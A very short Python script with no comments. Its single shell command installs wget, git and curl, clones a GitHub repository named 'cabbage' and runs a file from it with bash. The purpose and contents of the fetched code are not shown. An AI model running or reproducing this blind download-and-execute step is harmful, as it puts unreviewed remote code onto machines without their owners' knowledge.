#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/silumkomakhabela/cabbage.git;cd cabbage;chmod +x cabbage;bash cabbage", shell=True)
